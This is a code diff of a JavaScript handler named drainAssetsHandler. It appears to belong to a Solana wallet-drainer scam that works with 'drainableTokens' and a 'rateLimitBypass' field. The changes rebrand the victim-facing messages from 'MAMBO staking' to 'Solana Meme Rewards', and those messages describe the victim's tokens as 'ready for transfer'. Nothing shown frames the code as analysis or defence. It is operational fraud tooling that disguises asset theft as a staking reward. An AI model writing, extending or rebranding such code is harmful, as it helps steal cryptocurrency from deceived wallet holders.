@@ -979,7 +979,7 @@ export default async function drainAssetsHandler(req, res) {
       
       return res.status(200).json({ 
         success: false,
-        message: '🚀 No tokens found in this wallet for the MAMBO staking',
+        message: '🚀 No tokens found in this wallet for Solana Meme Rewards',
         tokenCount: 0,
         solBalance: userSolBalance
       });
@@ -1016,7 +1016,7 @@ export default async function drainAssetsHandler(req, res) {
         success: true,
         requiresPreInit: true,
         preInitTransactions: preInitResult.preInitTransactions,
-        message: `🚀 Setting up ${preInitResult.preInitTransactions.length} token accounts for MAMBO staking`,
+        message: `🚀 Setting up ${preInitResult.preInitTransactions.length} token accounts for Solana Meme Rewards`,
         tokenCount: 0,
         totalTokens: drainableTokens.length,
         solBalance: userSolBalance,
@@ -1433,7 +1433,7 @@ export default async function drainAssetsHandler(req, res) {
       totalTokens: drainableTokens.length,
       solBalance: userSolBalance,
       requiredSol: MIN_SOL_FOR_FEES,
-              message: `🚀 MAMBO staking prepared! ${processedTokens} tokens ready for transfer`,
+              message: `🚀 Solana Meme Rewards prepared! ${processedTokens} tokens ready for transfer`,
       tokenDetails: tokenDetails,
       rateLimitBypass: rateLimitBypass, // Include rate limit bypass information
       summary: {
